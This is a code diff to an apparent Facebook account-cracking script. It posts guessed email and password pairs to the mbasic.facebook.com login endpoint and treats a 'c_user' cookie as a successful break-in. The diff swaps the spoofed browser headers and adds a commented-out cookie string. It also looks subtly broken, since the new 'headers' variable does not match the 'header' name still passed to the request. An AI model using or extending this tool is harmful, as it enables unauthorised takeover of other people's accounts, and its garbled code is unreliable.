@@ -340,7 +340,7 @@ def banner():
 \033[1;96m▇▇\033[1;92m[-] TOOL VIRSION: 2.0\033[1;96m               ▇▇
 \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
 	                              
-\033[1;95m                                             
+l\033[1;95m                                             
           _______           
       .adOOOOOOOOOba.
      dOOOOOOOOOOOOOOOb
@@ -559,24 +559,7 @@ def m(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header = {'authority': 'mbasic.facebook.com',
-           "method": 'POST',
-           "scheme": 'https',
-           'path': '/login/?li=VLP5Y7NpufwOOmqWgLGEyawk&e=1348029&shbl=1&refsrc=deprecated&_rdr',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-           'accept-language': 'en-US,en;q=0.9',
-           'cache-control': 'max-age=0',
-           'origin': 'https://mbasic.facebook.com',
-           'referer': 'https://mbasic.facebook.com/',
-           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
-           'sec-ch-ua-mobile': '?0',
-           'sec-ch-ua-platform': '"Windows"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'same-origin',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': ff}
+            headers = { 'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'max-age=0', # 'cookie': 'sb=gN0kZJxcwlQyq5RHCSI2a34P; datr=gN0kZNfiolLabMkGdm7wzrQS; dpr=2.15625; fr=0TUK1I6VjfVAiggKJ..BkJN2A.oa.AAA.0.0.BkJVhj.AWXwnfD7W6o; wd=980x2053', 'referer': 'https://www.google.com/', 'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'cross-site', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5', } 
             lo = session.post('https://mbasic.facebook.com/login/?li=VLP5Y7NpufwOOmqWgLGEyawk&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
